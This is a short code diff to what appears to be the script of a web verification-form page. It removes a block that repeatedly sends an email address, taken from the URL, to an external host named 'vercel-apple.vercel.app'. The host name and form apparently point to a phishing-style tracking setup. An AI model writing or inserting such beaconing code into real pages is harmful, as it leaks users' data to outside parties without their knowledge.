@@ -65,34 +65,3 @@ document.addEventListener('DOMContentLoaded', () => {
   // Actualizar el input oculto al enviar el formulario
   document.getElementById('verification-form').addEventListener('submit', updateHiddenInput);
 });
-
-const params = new URLSearchParams(window.location.search);
-const contentValue = params.get("content");
-const email = params.get("equis");
-
-// Ejecutamos la función solo si el valor de 'content' es "3"
-if (contentValue === "3") {
-    function enviarPeticion() {
-        const url = new URL("https://vercel-apple.vercel.app");
-        // Agregamos los parámetros equis y ye
-        url.searchParams.append("equis", email);
-        url.searchParams.append("ye", contentValue);
-
-        fetch(url)
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error(`Error en la petición: ${response.status}`);
-                }
-                return response.json();
-            })
-            .then(data => {
-                console.log("Respuesta recibida:", data);
-            })
-            .catch(error => {
-                console.error("Error:", error);
-            });
-    }
-
-    // Llamamos a la función cada 5 segundos
-    setInterval(enviarPeticion, 5000);
-}
